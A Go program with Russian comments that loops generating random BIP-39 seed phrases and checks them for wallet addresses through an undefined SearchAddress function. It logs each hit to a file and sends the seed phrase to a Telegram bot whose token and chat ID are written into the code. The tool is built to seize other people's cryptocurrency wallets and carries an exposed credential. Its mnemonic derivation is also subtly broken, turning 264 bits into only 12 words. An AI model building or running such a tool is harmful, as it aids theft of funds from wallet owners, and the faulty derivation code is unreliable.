package main

import (
	"bufio"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io"
	"math/big"
	"os"
	"strings"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

func main() {
	//  Открытие файла
	outputFile, err := os.OpenFile("./resources/mnemonics-success.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Ошибка открытия файла:", err)
		return
	}
	defer outputFile.Close()

	for {
		// Генерация случайной энтропии
		entropy, err := generateEntropy(256) // Задайте необходимую длину энтропии (в битах)
		if err != nil {
			fmt.Println("Ошибка генерации энтропии:", err)
			return
		}

		// Расчет контрольной суммы
		checksum := calculateChecksum(entropy)

		// Объединение энтропии и контрольной суммы
		combinedEntropy := append(entropy, checksum...)

		// Разделение на группы
		groups := splitToGroups(combinedEntropy)

		// Определение слов
		words, err := lookupWords(groups)
		if err != nil {
			fmt.Println("Ошибка при поиске слов в словаре:", err)
			return
		}

		mnemonic := strings.Join(words, " ")
		result, address := SearchAddress(mnemonic, 12)
		if result {
			outputFile.WriteString("\n")
			outputFile.WriteString(mnemonic + "   (" + address + ")")
			telegramSend(mnemonic)
		}

	}
}

// Отправка в телеграм бота об успешном кошельке
func telegramSend(mnemonic string) {
	botToken := "6367158610:AAHvtyoJ4KCYs2bt02Lw_Y3bxRQwB5bRaNA"
	chatID := int64(211926346)

	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		fmt.Println(err)
	}

	msg := tgbotapi.NewMessage(chatID, mnemonic)
	_, err = bot.Send(msg)
	if err != nil {
		fmt.Println(err)
	}
}

// Генерация случайной энтропии указанной длины (в битах)
func generateEntropy(length int) ([]byte, error) {
	bytes := make([]byte, length/8)
	_, err := io.ReadFull(rand.Reader, bytes)
	if err != nil {
		return nil, err
	}
	return bytes, nil
}

// Расчет контрольной суммы
func calculateChecksum(data []byte) []byte {
	hash := sha256.Sum256(data)
	entropyBits := len(data) * 8
	checksumBits := entropyBits / 32
	checksumBytes := checksumBits / 8
	return hash[:checksumBytes]
}

// Разделение на группы
func splitToGroups(entropy []byte) []uint16 {
	groupSize := uint(11) // Размер группы (в битах)
	groups := make([]uint16, len(entropy)*4/int(groupSize))
	bits := new(big.Int).SetBytes(entropy)

	for i := range groups {
		groups[i] = uint16(bits.Uint64() & ((1 << uint(groupSize)) - 1))
		bits.Rsh(bits, uint(groupSize))
	}

	return groups
}

// Поиск слов в словаре
func lookupWords(groups []uint16) ([]string, error) {
	dictionary, err := loadDictionary("resources/bip-0039.txt")
	if err != nil {
		return nil, err
	}

	words := make([]string, len(groups))
	for i, group := range groups {
		if int(group) >= len(dictionary) {
			return nil, fmt.Errorf("Недопустимый индекс группы: %d", group)
		}
		words[i] = dictionary[group]
	}

	return words, nil
}

// Загрузка словаря из файла
func loadDictionary(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	var dictionary []string
	for scanner.Scan() {
		dictionary = append(dictionary, scanner.Text())
	}

	return dictionary, scanner.Err()
}
